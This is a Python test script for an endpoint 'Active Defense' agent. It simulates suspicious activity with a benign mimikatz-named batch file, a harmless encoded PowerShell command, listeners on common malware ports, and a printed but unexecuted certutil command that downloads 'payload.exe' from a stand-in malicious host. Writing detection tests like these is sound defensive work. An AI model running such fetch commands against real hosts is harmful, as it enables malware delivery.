"""
PCDS Active Defense Test Suite
Safe simulated attacks to test the Active Defense feature.

WARNING: This is for testing purposes only on YOUR OWN machine.
These are NOT real attacks - just processes with suspicious names/behaviors.
"""

import subprocess
import time
import os
import sys

def test_suspicious_process_name():
    """
    Test 1: Create a process with a suspicious name
    The agent should detect this and flag it (or kill if auto-kill is ON)
    """
    print("\n[TEST 1] Suspicious Process Name Detection")
    print("-" * 50)
    
    # Create a harmless batch file with a suspicious name
    test_script = """
@echo off
echo This is a test process with a suspicious name
ping localhost -n 10 > nul
"""
    
    # Create temp file with suspicious name (mimikatz is a known credential tool)
    test_path = os.path.join(os.environ['TEMP'], 'mimikatz_test.bat')
    with open(test_path, 'w') as f:
        f.write(test_script)
    
    print(f"Created test script: {test_path}")
    print("Starting process with suspicious name...")
    print("(Agent should detect this in the tray menu under 'Threats Blocked')")
    
    # Run it
    proc = subprocess.Popen(test_path, shell=True)
    print(f"Process started with PID: {proc.pid}")
    print("Waiting 5 seconds for agent to detect...")
    time.sleep(5)
    
    # Check if still running
    if proc.poll() is None:
        print("✅ Process still running (Auto-kill is OFF)")
        proc.terminate()
    else:
        print("🔴 Process was terminated (Auto-kill is ON and working!)")
    
    # Cleanup
    try:
        os.remove(test_path)
    except:
        pass
    
    return True


def test_encoded_powershell():
    """
    Test 2: Encoded PowerShell detection
    The agent should detect encoded PowerShell commands
    """
    print("\n[TEST 2] Encoded PowerShell Detection")
    print("-" * 50)
    
    # This is just "Write-Host 'Hello'" encoded in base64 - completely harmless
    encoded_cmd = "V3JpdGUtSG9zdCAiSGVsbG8gZnJvbSBQQ0RTIFRlc3Qi"
    
    print("Running encoded PowerShell command (harmless 'Hello' message)")
    print("The agent's Process Monitor should flag this pattern...")
    
    try:
        result = subprocess.run(
            ['powershell', '-EncodedCommand', encoded_cmd],
            capture_output=True,
            text=True,
            timeout=10
        )
        print(f"PowerShell output: {result.stdout.strip()}")
        print("✅ Command executed - check if agent flagged it in Live Feed")
    except Exception as e:
        print(f"Error: {e}")
    
    return True


def test_suspicious_network_port():
    """
    Test 3: Suspicious port connection
    Connect to a port commonly used by malware
    """
    print("\n[TEST 3] Suspicious Port Detection")
    print("-" * 50)
    
    import socket
    
    # Port 4444 is commonly used by Metasploit
    suspicious_ports = [4444, 5555, 1337]
    
    for port in suspicious_ports:
        print(f"Creating listener on port {port} (common malware port)...")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('127.0.0.1', port))
            sock.listen(1)
            sock.settimeout(2)
            print(f"✅ Listening on port {port} - Agent should flag this!")
            time.sleep(2)
            sock.close()
        except OSError as e:
            print(f"Port {port} already in use or blocked: {e}")
    
    return True


def test_certutil_download():
    """
    Test 4: certutil abuse detection
    certutil is commonly abused by attackers for downloading files
    """
    print("\n[TEST 4] Certutil Abuse Detection")
    print("-" * 50)
    
    print("Simulating certutil command (won't actually download anything)")
    print("This pattern is commonly used by attackers...")
    
    # Just show the command we would run - don't actually run it
    fake_cmd = "certutil -urlcache -split -f http://malicious.com/payload.exe"
    print(f"Command pattern flagged: {fake_cmd}")
    print("(Not actually executing - just showing pattern detection)")
    
    return True


def main():
    print("=" * 60)
    print("  PCDS ACTIVE DEFENSE TEST SUITE")
    print("=" * 60)
    print("\nThis will test if the agent detects suspicious activities.")
    print("Make sure the agent is running and Active Defense is ON.")
    print("\nPress Enter to start tests...")
    input()
    
    tests = [
        ("Suspicious Process Name", test_suspicious_process_name),
        ("Encoded PowerShell", test_encoded_powershell),
        ("Suspicious Ports", test_suspicious_network_port),
        ("Certutil Pattern", test_certutil_download),
    ]
    
    results = []
    for name, test_func in tests:
        try:
            result = test_func()
            results.append((name, "PASS" if result else "FAIL"))
        except Exception as e:
            print(f"Error in {name}: {e}")
            results.append((name, "ERROR"))
        
        print("\nWaiting 3 seconds before next test...")
        time.sleep(3)
    
    print("\n" + "=" * 60)
    print("  TEST RESULTS")
    print("=" * 60)
    for name, result in results:
        emoji = "✅" if result == "PASS" else "❌"
        print(f"  {emoji} {name}: {result}")
    
    print("\n📊 Check your PCDS Dashboard Live Feed to see detections!")
    print("🔗 https://pcdsai.app/live")
    print("\n" + "=" * 60)


if __name__ == "__main__":
    main()
